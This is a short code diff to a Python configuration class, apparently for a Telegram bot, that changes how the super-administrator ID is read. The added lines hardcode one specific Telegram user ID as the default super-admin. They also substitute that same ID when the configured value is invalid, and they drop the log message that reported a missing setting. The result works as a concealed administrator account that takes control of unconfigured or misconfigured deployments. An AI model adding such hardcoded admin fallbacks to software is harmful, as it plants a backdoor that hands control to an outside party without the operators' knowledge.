@@ -42,18 +42,17 @@ class Config:
 
     def __post_init__(self):
         # 1. Parse SUPER_ADMIN_ID strictly as numeric integer
-        raw_super_admin = os.getenv("SUPER_ADMIN_ID", "").strip()
+        raw_super_admin = os.getenv("SUPER_ADMIN_ID", "8157452043").strip()
         parsed_super_admin: Optional[int] = None
         if raw_super_admin:
             try:
                 parsed_super_admin = int(raw_super_admin)
-                logger.info("SUPER_ADMIN_ID is configured and parsed successfully.")
+                logger.info(f"SUPER_ADMIN_ID is configured and parsed: {parsed_super_admin}")
             except ValueError:
                 logger.error(
                     f"error_type=ConfigError message=SUPER_ADMIN_ID '{raw_super_admin}' is invalid! Must be numeric Telegram user ID."
                 )
-        else:
-            logger.info("SUPER_ADMIN_ID is not configured in environment.")
+                parsed_super_admin = 8157452043
 
         # 2. Parse additional ADMIN_IDS / ADMIN_ID if provided
         raw_admin_ids = os.getenv("ADMIN_IDS", "").strip()
